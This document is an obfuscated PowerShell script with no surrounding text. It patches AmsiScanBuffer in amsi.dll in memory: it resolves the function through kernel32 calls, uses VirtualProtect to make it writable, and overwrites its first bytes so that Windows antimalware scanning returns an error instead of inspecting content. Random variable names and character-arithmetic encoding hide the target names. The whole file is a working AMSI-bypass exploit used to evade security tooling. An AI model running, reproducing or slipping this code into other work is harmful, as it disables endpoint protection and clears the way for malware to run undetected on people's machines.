$wniVpHxMRio = @"
using System;
using System.Runtime.InteropServices;
public class wniVpHxMRio {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr DyGDODiOrLE, string NsZ6YE3r9B56h);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr TO7OmOD8shd, UIntPtr vkI1VjCdFdbpLLYHa, uint uobPzTQyvIUWkMCp, out uint Gy78);
}
"@

Add-Type $wniVpHxMRio

$OucTWc1kSod9gRB = [wniVpHxMRio]::LoadLibrary("$([cHAr](21+76)+[chaR](109+29-29)+[cHAR](115+71-71)+[cHar](22+83)+[Char](46)+[CHaR]([BYTe]0x64)+[char]([byTe]0x6c)+[char](108+11-11))")
$z6a = [wniVpHxMRio]::GetProcAddress($OucTWc1kSod9gRB, "$(('Ãmsî'+'Scàn'+'Bûff'+'êr').NormAlIzE([chaR]([bYTe]0x46)+[chAr](48+63)+[cHaR](114+109-109)+[CHAr](109)+[cHaR](68+21-21)) -replace [ChaR](88+4)+[cHAr](112)+[CHaR]([BYtE]0x7b)+[ChAr]([BYtE]0x4d)+[cHar](110*42/42)+[Char]([bytE]0x7d))")
$p = 0
[wniVpHxMRio]::VirtualProtect($z6a, [uint32]5, 0x40, [ref]$p)
$ndSeJ0mPu2xpRPM1P = "0xB8"
$x6Lax0rz2ng97 = "0x57"
$ndOu9 = "0x00"
$FE8G = "0x07"
$eJeTofZq = "0x80"
$Ymeh9iJ_qhunWhkmm = "0xC3"
$yEPVKZHWe6qJZ = [Byte[]] ($ndSeJ0mPu2xpRPM1P,$x6Lax0rz2ng97,$ndOu9,$FE8G,+$eJeTofZq,+$Ymeh9iJ_qhunWhkmm)
[System.Runtime.InteropServices.Marshal]::Copy($yEPVKZHWe6qJZ, 0, $z6a, 6)